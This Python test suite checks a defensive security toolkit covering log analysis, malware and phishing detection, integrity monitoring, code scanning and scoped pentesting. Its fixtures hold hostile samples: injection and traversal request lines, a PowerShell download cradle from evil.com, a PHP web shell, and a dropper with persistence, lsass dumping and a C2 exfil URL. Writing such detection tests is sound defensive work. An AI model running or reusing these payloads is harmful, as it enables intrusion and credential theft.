"""
Unit and Integration Test Suite for J.A.R.V.I.S. Cybersecurity Intelligence Specialist (Capabilities 46-60).
Covers:
46. Security Posture Analysis
47. Vulnerability Management
48. Log Analysis
49. Malware Detection
50. File Integrity Monitoring
51. Network Inventory
52. Firewall Auditing
53. Password Security Auditing
54. Phishing Detection
55. Security Report Generation
56. Dependency Vulnerability Scanning
57. Secure Coding Analysis
58. Incident Response Assistant
59. Sandbox Analysis
60. Authorized Penetration Testing
"""

import unittest
import os
import sys
import tempfile
import json
import shutil
import base64

# Ensure workspace root is in sys.path
WORKSPACE_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if WORKSPACE_ROOT not in sys.path:
    sys.path.insert(0, WORKSPACE_ROOT)

from jarvis.cybersecurity import (
    CybersecurityEngine,
    cybersecurity_engine,
    # Cap 46
    SecurityPostureAnalyzer,
    PostureReport,
    # Cap 47
    VulnerabilityManager,
    VulnerabilityItem,
    # Cap 48
    LogAnalyzer,
    SecurityLogIncident,
    # Cap 49
    MalwareDetector,
    MalwareScanResult,
    # Cap 50
    FileIntegrityMonitor,
    BaselineReport,
    # Cap 51
    NetworkInventoryScanner,
    HostInventory,
    # Cap 52
    FirewallAuditor,
    FirewallRule,
    FirewallAuditReport,
    # Cap 53
    PasswordAuditor,
    PasswordAuditResult,
    # Cap 54
    PhishingDetector,
    PhishingAssessment,
    # Cap 55
    SecurityReportGenerator,
    # Cap 56
    DependencyScanner,
    DependencyScanReport,
    # Cap 57
    SecureCodingAnalyzer,
    CodeFlawFinding,
    # Cap 58
    IncidentResponseAssistant,
    IncidentRecord,
    # Cap 59
    SandboxAnalyzer,
    SandboxAnalysisReport,
    # Cap 60
    AuthorizedPenTester,
    PentestReport,
)


class TestSecurityPostureAnalysis(unittest.TestCase):
    """Capability 46: Security Posture Analysis Tests."""

    def test_posture_pristine_environment(self):
        analyzer = SecurityPostureAnalyzer(
            override_admin=False,
            override_av={"real_time_protection": True, "installed": True},
        )
        report = analyzer.assess_posture(
            firewall_active=True,
            uac_enabled=True,
            auto_update_enabled=True,
            mock_open_ports=[],
        )
        self.assertEqual(report.score, 100)
        self.assertEqual(report.grade, "A")
        self.assertEqual(len(report.findings), 0)
        self.assertFalse(report.is_admin)

    def test_posture_degraded_environment(self):
        analyzer = SecurityPostureAnalyzer(
            override_admin=True,
            override_av={"real_time_protection": False, "installed": True},
        )
        report = analyzer.assess_posture(
            firewall_active=False,
            uac_enabled=False,
            auto_update_enabled=False,
            mock_open_ports=[23, 445],  # Telnet and SMB open
        )
        self.assertLess(report.score, 50)
        self.assertEqual(report.grade, "F")
        self.assertTrue(report.summary["CRITICAL"] >= 2)  # AV disabled + Telnet port 23
        self.assertTrue(report.is_admin)
        self.assertFalse(report.firewall_enabled)

        # Test dictionary export
        rep_dict = report.to_dict()
        self.assertIn("findings", rep_dict)
        self.assertEqual(rep_dict["grade"], "F")


class TestVulnerabilityManagement(unittest.TestCase):
    """Capability 47: Vulnerability Management Tests."""

    def setUp(self):
        self.vm = VulnerabilityManager()

    def test_register_and_query_vulnerabilities(self):
        v1 = self.vm.register_vulnerability(
            cve_id="CVE-2023-38606",
            title="Kernel Privilege Escalation",
            component="kernel.sys",
            affected_versions="< 10.0.19045",
            cvss_score=8.8,
            description="Buffer overflow allows elevation of privilege.",
            remediation="Apply cumulative security update KB5028166.",
        )
        self.assertEqual(v1.severity, "HIGH")
        self.assertEqual(v1.status, "OPEN")
        self.assertEqual(v1.target_sla_days, 7)

        v2 = self.vm.register_vulnerability(
            cve_id="CVE-2024-21338",
            title="AppLocker Driver Zero-Day",
            component="appid.sys",
            affected_versions="< 10.0.22621",
            cvss_score=9.8,
            description="Arbitrary kernel read/write.",
            remediation="Apply security patch immediately.",
        )
        self.assertEqual(v2.severity, "CRITICAL")
        self.assertEqual(v2.target_sla_days, 1)

        # Query tests
        crit_vulns = self.vm.query(severity="CRITICAL")
        self.assertEqual(len(crit_vulns), 1)
        self.assertEqual(crit_vulns[0].cve_id, "CVE-2024-21338")

        # Status update
        success = self.vm.update_status(v1.id, "MITIGATED", "Patch deployed via SCCM")
        self.assertTrue(success)
        self.assertEqual(self.vm.get_vulnerability(v1.id).status, "MITIGATED")

        # Invalid status should raise ValueError
        with self.assertRaises(ValueError):
            self.vm.update_status(v1.id, "INVALID_STATE")

    def test_risk_index_and_markdown(self):
        self.vm.register_vulnerability(
            cve_id="CVE-2023-1111",
            title="Test Vulnerability",
            component="libtest",
            affected_versions="1.0.0",
            cvss_score=7.5,
            description="Test vuln",
            remediation="Upgrade",
        )
        risk = self.vm.calculate_risk_index()
        self.assertGreater(risk, 0.0)
        self.assertLessEqual(risk, 100.0)

        md = self.vm.to_markdown_summary()
        self.assertIn("CVE-2023-1111", md)
        self.assertIn("libtest", md)

    def test_sla_breach_detection(self):
        # Register a critical vulnerability with 1 day SLA
        v = self.vm.register_vulnerability(
            cve_id="CVE-2024-9999",
            title="Overdue Critical Zero-Day",
            component="core.dll",
            affected_versions="1.0",
            cvss_score=9.9,
            description="Remote code execution",
            remediation="Patch",
        )
        # Mock older creation date (5 days ago)
        from datetime import datetime, timezone, timedelta
        old_time = (datetime.now(timezone.utc) - timedelta(days=5)).isoformat()
        v.created_at = old_time

        breaches = self.vm.check_sla_breaches()
        self.assertEqual(len(breaches), 1)
        self.assertEqual(breaches[0]["cve_id"], "CVE-2024-9999")
        self.assertGreater(breaches[0]["days_overdue"], 3.0)


class TestLogAnalysis(unittest.TestCase):
    """Capability 48: Log Analysis Tests."""

    def setUp(self):
        self.analyzer = LogAnalyzer(brute_force_threshold=3)

    def test_web_log_threat_detection(self):
        logs = [
            '192.168.1.50 - - [12/Nov/2026:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1024',
            '192.168.1.100 - - [12/Nov/2026:10:01:00 +0000] "GET /products.php?id=1 UNION SELECT 1,username,password FROM users HTTP/1.1" 200 4096',
            '192.168.1.101 - - [12/Nov/2026:10:02:00 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 512',
            '192.168.1.102 - - [12/Nov/2026:10:03:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 256',
        ]
        incidents = self.analyzer.analyze_web_logs(logs)
        self.assertEqual(len(incidents), 3)

        rule_ids = [inc.rule_id for inc in incidents]
        self.assertIn("LOG-WEB-SQLI", rule_ids)
        self.assertIn("LOG-WEB-XSS", rule_ids)
        self.assertIn("LOG-WEB-TRAVERSAL", rule_ids)

    def test_windows_event_log_tampering_and_brute_force(self):
        events = [
            # 3 failed logins from same IP
            {"EventID": 4625, "TimeCreated": "2026-11-12T10:00:00Z", "Data": {"IpAddress": "10.0.0.99", "TargetUserName": "admin"}},
            {"EventID": 4625, "TimeCreated": "2026-11-12T10:00:05Z", "Data": {"IpAddress": "10.0.0.99", "TargetUserName": "admin"}},
            {"EventID": 4625, "TimeCreated": "2026-11-12T10:00:10Z", "Data": {"IpAddress": "10.0.0.99", "TargetUserName": "admin"}},
            # Log tampering event 1102
            {"EventID": 1102, "TimeCreated": "2026-11-12T10:01:00Z", "Data": {"SubjectUserName": "AttackerAdmin"}},
            # Suspicious PowerShell creation 4688
            {
                "EventID": 4688,
                "TimeCreated": "2026-11-12T10:02:00Z",
                "Data": {"CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA..."},
            },
        ]
        incidents = self.analyzer.analyze_windows_events(events)
        rule_ids = [inc.rule_id for inc in incidents]

        self.assertIn("LOG-BRUTE-FORCE", rule_ids)
        self.assertIn("LOG-WIN-1102", rule_ids)
        self.assertIn("LOG-WIN-4688-PS", rule_ids)

    def test_syslog_ssh_and_sudo_detection(self):
        syslogs = [
            "Nov 12 10:00:01 server sshd[1234]: Failed password for invalid user admin from 192.168.1.77 port 44332 ssh2",
            "Nov 12 10:00:03 server sshd[1235]: Failed password for invalid user admin from 192.168.1.77 port 44334 ssh2",
            "Nov 12 10:00:05 server sshd[1236]: Failed password for invalid user root from 192.168.1.77 port 44336 ssh2",
            "Nov 12 10:05:00 server sudo: bob : 3 incorrect password attempts ; TTY=pts/0 ; USER=root ; COMMAND=/bin/bash",
        ]
        incidents = self.analyzer.analyze_syslog(syslogs)
        rule_ids = [inc.rule_id for inc in incidents]
        self.assertIn("LOG-SSH-BRUTE-FORCE", rule_ids)
        self.assertIn("LOG-SYS-SUDO-FAIL", rule_ids)


class TestMalwareDetection(unittest.TestCase):
    """Capability 49: Malware Detection Tests."""

    def setUp(self):
        self.detector = MalwareDetector()

    def test_eicar_signature_match(self):
        eicar_string = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        result = self.detector.scan_bytes(eicar_string, filename="eicar.com")

        self.assertEqual(result.verdict, "MALICIOUS")
        self.assertEqual(result.threat_score, 100)
        self.assertIn("Test.EICAR.StandardAVTest", result.matched_signatures)

    def test_high_entropy_packed_payload(self):
        # Generate pseudo-random bytes with near 8.0 entropy
        high_entropy_data = os.urandom(4096)
        result = self.detector.scan_bytes(high_entropy_data, filename="packed_sample.bin")

        self.assertGreater(result.entropy, 7.5)
        self.assertIn("HEUR-ENTROPY-HIGH", [f.rule_id for f in result.heuristic_findings])
        self.assertIn(result.verdict, ["SUSPICIOUS", "MALICIOUS"])

    def test_powershell_download_cradle_heuristics(self):
        suspicious_script = b"""
        powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
        (New-Object System.Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX
        """
        result = self.detector.scan_bytes(suspicious_script, filename="dropper.bat")
        self.assertIn(result.verdict, ["SUSPICIOUS", "MALICIOUS"])
        rule_ids = [f.rule_id for f in result.heuristic_findings]
        self.assertIn("HEUR-SCRIPT-OBFUSCATION", rule_ids)

    def test_benign_plain_text(self):
        benign = b"Hello, this is a clean and simple harmless text document.\nNo binaries here."
        result = self.detector.scan_bytes(benign, filename="notes.txt")
        self.assertEqual(result.verdict, "CLEAN")
        self.assertEqual(result.threat_score, 0)
        self.assertEqual(len(result.matched_signatures), 0)

    def test_pe_packer_detection(self):
        # Construct synthetic minimal PE structure with UPX section
        pe_stub = bytearray(b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00" + b"PE\x00\x00" + b".upx0\x00\x00\x00" + b"\x00" * 200)
        res = self.detector.scan_bytes(bytes(pe_stub), filename="packed.exe")
        rule_ids = [f.rule_id for f in res.heuristic_findings]
        self.assertIn("HEUR-PE-PACKER", rule_ids)
        self.assertIn(res.verdict, ["SUSPICIOUS", "MALICIOUS"])


class TestFileIntegrityMonitoring(unittest.TestCase):
    """Capability 50: File Integrity Monitoring (FIM) Tests."""

    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="jarvis_fim_test_")
        self.fim = FileIntegrityMonitor()

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_fim_baseline_and_tamper_detection(self):
        # Create initial test files
        file1 = os.path.join(self.test_dir, "config.ini")
        file2 = os.path.join(self.test_dir, "secret.key")
        with open(file1, "w") as f:
            f.write("setting=safe")
        with open(file2, "w") as f:
            f.write("initial_key_data")

        # 1. Create baseline
        baseline = self.fim.create_baseline([self.test_dir], baseline_name="test_base")
        self.assertEqual(baseline.file_count, 2)

        # 2. Verify pristine integrity
        alerts_clean = self.fim.verify_integrity("test_base", check_directories=[self.test_dir])
        self.assertEqual(len(alerts_clean), 0)

        # 3. Tamper with file1 (MODIFIED)
        with open(file1, "w") as f:
            f.write("setting=malicious_override")

        # 4. Delete file2 (DELETED)
        os.remove(file2)

        # 5. Add unexpected new file (ADDED)
        file3 = os.path.join(self.test_dir, "backdoor.php")
        with open(file3, "w") as f:
            f.write("<?php system($_GET['cmd']); ?>")

        alerts = self.fim.verify_integrity("test_base", check_directories=[self.test_dir])
        alert_types = {a.change_type for a in alerts}
        self.assertIn("MODIFIED", alert_types)
        self.assertIn("DELETED", alert_types)
        self.assertIn("ADDED", alert_types)

        # 6. Test JSON persistence
        json_path = os.path.join(self.test_dir, "baseline.json")
        self.fim.save_baseline_to_file("test_base", json_path)
        self.assertTrue(os.path.exists(json_path))

        loaded = self.fim.load_baseline_from_file(json_path)
        self.assertEqual(loaded.file_count, 2)


class TestNetworkInventory(unittest.TestCase):
    """Capability 51: Network Inventory & Authorized Scanning Tests."""

    def setUp(self):
        self.scanner = NetworkInventoryScanner()

    def test_local_interface_enumeration(self):
        ifaces = self.scanner.get_local_interfaces()
        self.assertGreater(len(ifaces), 0)
        loopback_found = any(any("127.0.0.1" in ip for ip in iface.ip_addresses) for iface in ifaces)
        self.assertTrue(loopback_found)

    def test_scope_guardrails(self):
        # 127.0.0.1 and private IPs are authorized
        self.assertTrue(self.scanner.is_target_authorized("127.0.0.1"))
        self.assertTrue(self.scanner.is_target_authorized("192.168.1.1"))
        self.assertTrue(self.scanner.is_target_authorized("10.0.0.5"))

        # Unauthorized external public IPs are strictly blocked
        self.assertFalse(self.scanner.is_target_authorized("8.8.8.8"))
        self.assertFalse(self.scanner.is_target_authorized("1.1.1.1"))

        # Scanning unauthorized host raises PermissionError
        with self.assertRaises(PermissionError):
            self.scanner.scan_host("8.8.8.8", ports=[80])

    def test_authorized_loopback_scan(self):
        # Scan loopback on unlikely port
        res = self.scanner.scan_host("127.0.0.1", ports=[65530])
        self.assertEqual(res.target_ip, "127.0.0.1")
        self.assertIsInstance(res.open_ports, list)


class TestFirewallAuditing(unittest.TestCase):
    """Capability 52: Firewall Auditing Tests."""

    def setUp(self):
        self.auditor = FirewallAuditor()

    def test_firewall_rule_evaluations(self):
        mock_profiles = {
            "Domain": {"enabled": True, "inbound": "Block", "outbound": "Allow"},
            "Private": {"enabled": True, "inbound": "Block", "outbound": "Allow"},
            "Public": {"enabled": True, "inbound": "Block", "outbound": "Allow"},
        }
        rules = [
            # Dangerous wildcard allow
            FirewallRule(
                name="Allow-All-Inbound-Wildcard",
                direction="Inbound",
                action="Allow",
                protocol="Any",
                local_ports="Any",
                remote_addresses="*",
                enabled=True,
                profile="Any",
            ),
            # Dangerous open SMB
            FirewallRule(
                name="Exposed-SMB-445",
                direction="Inbound",
                action="Allow",
                protocol="TCP",
                local_ports="445",
                remote_addresses="0.0.0.0/0",
                enabled=True,
                profile="Public",
            ),
            # Benign specific HTTPS rule
            FirewallRule(
                name="Safe-Web-HTTPS",
                direction="Inbound",
                action="Allow",
                protocol="TCP",
                local_ports="443",
                remote_addresses="192.168.1.0/24",
                enabled=True,
                profile="Private",
            ),
        ]

        report = self.auditor.audit_rules(rules=rules, mock_profiles=mock_profiles)
        self.assertFalse(report.is_compliant)
        self.assertLess(report.compliance_score, 80)

        crit_findings = [f for f in report.findings if f.severity == "CRITICAL"]
        self.assertGreaterEqual(len(crit_findings), 2)  # Wildcard + SMB 445


class TestPasswordSecurityAuditing(unittest.TestCase):
    """Capability 53: Password Security Auditing Tests."""

    def setUp(self):
        self.auditor = PasswordAuditor()

    def test_weak_and_dictionary_passwords(self):
        res1 = self.auditor.audit_password("password123")
        self.assertTrue(res1.is_common)
        self.assertEqual(res1.rating, "VERY_WEAK")
        self.assertLess(res1.score, 30)

        # Leetspeak test
        res_leet = self.auditor.audit_password("p@ssw0rd")
        self.assertTrue(res_leet.is_common)
        self.assertEqual(res_leet.rating, "VERY_WEAK")

    def test_strong_entropy_passwords(self):
        strong_pass = "K9#mQ8$vX2!zL5@wR7"
        res = self.auditor.audit_password(strong_pass)
        self.assertFalse(res.is_common)
        self.assertEqual(res.rating, "VERY_STRONG")
        self.assertGreater(res.score, 85)
        self.assertGreater(res.shannon_entropy, 3.5)
        self.assertGreater(res.pool_entropy_bits, 100)

    def test_nist_policy_compliance(self):
        bad_policy = {"min_length": 6, "rotation_days": 60, "check_compromised": False}
        res_bad = self.auditor.audit_password_policy(bad_policy)
        self.assertFalse(res_bad["is_nist_compliant"])

        good_policy = {"min_length": 12, "rotation_days": None, "check_compromised": True}
        res_good = self.auditor.audit_password_policy(good_policy)
        self.assertTrue(res_good["is_nist_compliant"])


class TestPhishingDetection(unittest.TestCase):
    """Capability 54: Phishing Detection Tests."""

    def setUp(self):
        self.detector = PhishingDetector()

    def test_typosquatting_and_subdomain_deception(self):
        # 1. Subdomain deception: paypal.com.verify-billing.xyz
        res1 = self.detector.analyze_url("http://paypal.com.verify-billing.xyz/login?account=update")
        self.assertEqual(res1.verdict, "PHISHING")
        self.assertEqual(res1.brand_targeted, "paypal")
        rule_ids1 = [i.rule_id for i in res1.indicators]
        self.assertIn("PHISH-BRAND-SUBDOMAIN", rule_ids1)
        self.assertIn("PHISH-SUSPICIOUS-TLD", rule_ids1)

        # 2. Typosquat apex domain: micros0ft.com
        res2 = self.detector.analyze_url("https://www.micros0ft.com/auth/login")
        self.assertEqual(res2.verdict, "PHISHING")
        self.assertEqual(res2.brand_targeted, "microsoft")
        rule_ids2 = [i.rule_id for i in res2.indicators]
        self.assertIn("PHISH-TYPOSQUAT", rule_ids2)

        # 3. Raw IP with credential keywords
        res3 = self.detector.analyze_url("http://185.220.101.5/banking/signin.php")
        self.assertIn(res3.verdict, ["SUSPICIOUS", "PHISHING"])
        rule_ids3 = [i.rule_id for i in res3.indicators]
        self.assertIn("PHISH-IP-HOST", rule_ids3)

        # 4. Clean legitimate URL
        res4 = self.detector.analyze_url("https://docs.python.org/3/library/unittest.html")
        self.assertEqual(res4.verdict, "CLEAN")
        self.assertEqual(res4.risk_score, 0)

    def test_punycode_and_at_symbol_deception(self):
        # Punycode homoglyph
        res_puny = self.detector.analyze_url("http://xn--gogle-pra.com/signin")
        rule_ids_puny = [i.rule_id for i in res_puny.indicators]
        self.assertIn("PHISH-PUNYCODE", rule_ids_puny)

        # Embedded @ symbol
        res_at = self.detector.analyze_url("http://google.com@attacker-site.org/login")
        rule_ids_at = [i.rule_id for i in res_at.indicators]
        self.assertIn("PHISH-AT-SYMBOL", rule_ids_at)


class TestSecurityReporting(unittest.TestCase):
    """Capability 55: Security Report Generation Tests."""

    def test_report_consolidation_and_formats(self):
        rep = SecurityReportGenerator(organization_name="Enterprise SOC")
        rep.add_finding(
            source="Firewall",
            finding_id="FW-001",
            title="SMB Port 445 Open to WAN",
            severity="CRITICAL",
            category="Network",
            description="Exposed SMB allows remote exploit.",
            remediation="Block port 445 on perimeter.",
            cwe_or_cve="CVE-2017-0144",
        )
        rep.add_finding(
            source="Code SAST",
            finding_id="SAST-002",
            title="Hardcoded AWS Secret",
            severity="HIGH",
            category="Credentials",
            description="Access key committed to repository.",
            remediation="Use environment variable.",
            cwe_or_cve="CWE-798",
        )

        risk = rep.calculate_overall_risk_score()
        self.assertGreaterEqual(risk, 35)

        # Markdown test
        md = rep.generate_markdown_report()
        self.assertIn("Enterprise SOC", md)
        self.assertIn("SMB Port 445 Open to WAN", md)
        self.assertIn("NIST CSF 2.0", md)

        # JSON test
        json_str = rep.generate_json_report()
        data = json.loads(json_str)
        self.assertEqual(data["total_findings"], 2)
        self.assertEqual(data["severity_summary"]["CRITICAL"], 1)


class TestDependencyScanning(unittest.TestCase):
    """Capability 56: Dependency Vulnerability Scanning Tests."""

    def setUp(self):
        self.scanner = DependencyScanner()

    def test_scan_requirements_txt(self):
        reqs = """
        # Core requirements
        requests==2.28.0
        urllib3==1.26.5
        flask==0.12.2
        safe-package==3.0.0
        """
        deps = self.scanner.parse_requirements_txt(reqs)
        self.assertEqual(deps["requests"], "2.28.0")
        self.assertEqual(deps["urllib3"], "1.26.5")

        report = self.scanner.scan_dependencies(deps)
        self.assertFalse(report.clean)
        self.assertGreaterEqual(len(report.vulnerabilities_found), 2)

        cves = [v.cve_id for v in report.vulnerabilities_found]
        self.assertIn("CVE-2023-32681", cves)  # requests < 2.31.0
        self.assertIn("CVE-2023-45803", cves)  # urllib3 < 2.0.7

    def test_scan_package_json(self):
        pkg_json = json.dumps({
            "dependencies": {
                "lodash": "4.17.15",
                "express": "4.18.2"
            }
        })
        deps = self.scanner.parse_package_json(pkg_json)
        self.assertEqual(deps["lodash"], "4.17.15")

        report = self.scanner.scan_dependencies(deps)
        cves = [v.cve_id for v in report.vulnerabilities_found]
        self.assertIn("CVE-2021-23337", cves)


class TestSecureCodingAnalysis(unittest.TestCase):
    """Capability 57: Secure Coding Analysis (SAST) Tests."""

    def setUp(self):
        self.sast = SecureCodingAnalyzer()

    def test_vulnerable_python_patterns(self):
        vulnerable_code = """
import os
import subprocess
import pickle
import hashlib
import tempfile
import requests

# 1. Hardcoded Secret
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"

def execute_cmd(user_arg):
    # 2. Command Injection
    subprocess.call("echo " + user_arg, shell=True)
    os.system("cat " + user_arg)

def load_payload(raw_data):
    # 3. Insecure Deserialization
    return pickle.loads(raw_data)

def hash_pw(pw):
    # 4. Weak Cryptography
    return hashlib.md5(pw.encode()).hexdigest()

def make_file():
    # 5. Insecure Temp file
    return tempfile.mktemp()

def fetch(url):
    # 6. Disabled SSL verification
    return requests.get(url, verify=False)
"""
        findings = self.sast.analyze_source_code(vulnerable_code)
        cwe_ids = [f.cwe_id for f in findings]

        self.assertIn("CWE-798", cwe_ids)  # Hardcoded credentials
        self.assertIn("CWE-78", cwe_ids)   # Command injection
        self.assertIn("CWE-502", cwe_ids)  # Pickle deserialization
        self.assertIn("CWE-327", cwe_ids)  # Weak hash MD5
        self.assertIn("CWE-377", cwe_ids)  # Insecure tempfile
        self.assertIn("CWE-295", cwe_ids)  # Disabled SSL


class TestIncidentResponse(unittest.TestCase):
    """Capability 58: Incident Response Assistant Tests."""

    def setUp(self):
        self.assistant = IncidentResponseAssistant()

    def test_ransomware_incident_workflow(self):
        inc = self.assistant.create_incident(
            title="Finance Server Ransomware Outbreak",
            incident_type="RANSOMWARE",
            impact_level="CRITICAL",
            urgency_level="CRITICAL",
            lead="Senior IR Analyst",
        )
        self.assertEqual(inc.priority, "P1")
        self.assertEqual(inc.phase, "DETECTION")
        self.assertTrue(len(inc.containment_playbook) >= 4)
        self.assertTrue(any("sever network connection" in s.lower() for s in inc.containment_playbook))

        # Advance phase to CONTAINMENT
        success = self.assistant.transition_phase(inc.incident_id, "CONTAINMENT", "Senior IR Analyst", "Host isolated.")
        self.assertTrue(success)
        self.assertEqual(inc.phase, "CONTAINMENT")

        # Log evidence
        fake_mem_dump = b"RAW_MEMORY_IMAGE_SAMPLE_BYTES"
        ev = self.assistant.log_evidence(
            incident_id=inc.incident_id,
            artifact_type="RAM_DUMP",
            file_path="C:\\Forensics\\mem.dmp",
            data_bytes=fake_mem_dump,
            collector="Digital Forensics Lead",
        )
        self.assertEqual(len(ev.sha256_hash), 64)
        self.assertEqual(len(inc.evidence_items), 1)
        self.assertGreaterEqual(len(inc.timeline), 3)


class TestSandboxAnalysis(unittest.TestCase):
    """Capability 59: Sandbox Analysis Tests."""

    def setUp(self):
        self.sandbox = SandboxAnalyzer()

    def test_sandbox_payload_heuristics_and_ioc_extraction(self):
        # Simulated multi-stage dropper script
        b64_payload = base64.b64encode(b"powershell.exe -ExecutionPolicy Bypass -Command 'http://c2-malware.org/beacon'").decode()
        script = f"""
        # Malicious Dropper with persistence, evasion, and credential dumping
        reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SecurityUpdate /t REG_SZ /d "C:\\temp\\backdoor.exe"
        schtasks.exe /create /tn "Updater" /tr "C:\\temp\\backdoor.exe" /sc ONLOGON
        Start-Sleep -Seconds 1200
        procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp
        sekurlsa::logonpasswords
        # Embedded base64
        {b64_payload}
        # Outbound C2
        http://198.51.100.44/api/v1/exfil
        """
        report = self.sandbox.analyze_payload(script.encode("latin-1"), name="dropper.ps1")
        self.assertEqual(report.verdict, "MALICIOUS")
        self.assertGreaterEqual(report.threat_score, 80)

        # Check IOCs
        self.assertTrue(any("c2-malware.org" in u or "198.51.100.44" in u for u in report.extracted_urls))
        self.assertIn("198.51.100.44", report.extracted_ips)

        # Check behaviors
        categories = {b.category for b in report.behaviors}
        self.assertIn("PERSISTENCE", categories)
        self.assertIn("CREDENTIAL_THEFT", categories)
        self.assertIn("EVASION", categories)


class TestAuthorizedPenTesting(unittest.TestCase):
    """Capability 60: Authorized Penetration Testing Tests."""

    def setUp(self):
        self.pentester = AuthorizedPenTester()

    def test_scope_and_authorization_enforcement(self):
        # Rejects if authorized flag is False
        with self.assertRaises(PermissionError):
            self.pentester.execute_controlled_test("127.0.0.1", ports=[80], authorized=False)

        # Rejects cloud metadata 169.254.169.254 even if authorized=True
        with self.assertRaises(PermissionError):
            self.pentester.execute_controlled_test("169.254.169.254", ports=[80], authorized=True)

        # Rejects unauthorized public IP
        with self.assertRaises(PermissionError):
            self.pentester.execute_controlled_test("93.184.216.34", ports=[80], authorized=True)

    def test_http_headers_and_tls_audit(self):
        # Test mock missing headers
        mock_headers = {
            "Content-Type": "text/html; charset=utf-8",
            "Server": "nginx",
        }
        rep = self.pentester.execute_controlled_test(
            "127.0.0.1",
            ports=[80],
            authorized=True,
            mock_headers=mock_headers,
            mock_tls_ver="TLSv1.0",
        )
        self.assertTrue(rep.authorized)
        self.assertIn("Content-Security-Policy", rep.header_audit["missing_headers"])
        self.assertIn("Strict-Transport-Security", rep.header_audit["missing_headers"])

        # TLS check flags obsolete TLS 1.0
        findings_titles = [f.title for f in rep.findings]
        self.assertTrue(any("Obsolete TLS" in t for t in findings_titles))

        # Check audit trail exists
        self.assertGreater(len(rep.audit_logs), 0)


class TestCybersecurityEngineIntegration(unittest.TestCase):
    """Integrated engine tests coordinating all 15 capabilities."""

    def test_engine_initialization_and_assessment(self):
        engine = CybersecurityEngine()
        self.assertIsNotNone(engine.posture)
        self.assertIsNotNone(engine.vulnerabilities)
        self.assertIsNotNone(engine.malware_detector)
        self.assertIsNotNone(engine.fim)
        self.assertIsNotNone(engine.network_inventory)
        self.assertIsNotNone(engine.firewall_auditor)
        self.assertIsNotNone(engine.password_auditor)
        self.assertIsNotNone(engine.phishing_detector)
        self.assertIsNotNone(engine.dependency_scanner)
        self.assertIsNotNone(engine.secure_coder)
        self.assertIsNotNone(engine.incident_assistant)
        self.assertIsNotNone(engine.sandbox)
        self.assertIsNotNone(engine.pentester)
        self.assertIsNotNone(engine.reporter)

        # Run comprehensive assessment
        assessment = engine.run_comprehensive_assessment(mock_env=True)
        self.assertIn("overall_risk_score", assessment)
        self.assertIn("posture_grade", assessment)
        self.assertIn("markdown_report", assessment)
        self.assertIn("json_report", assessment)


if __name__ == "__main__":
    unittest.main()
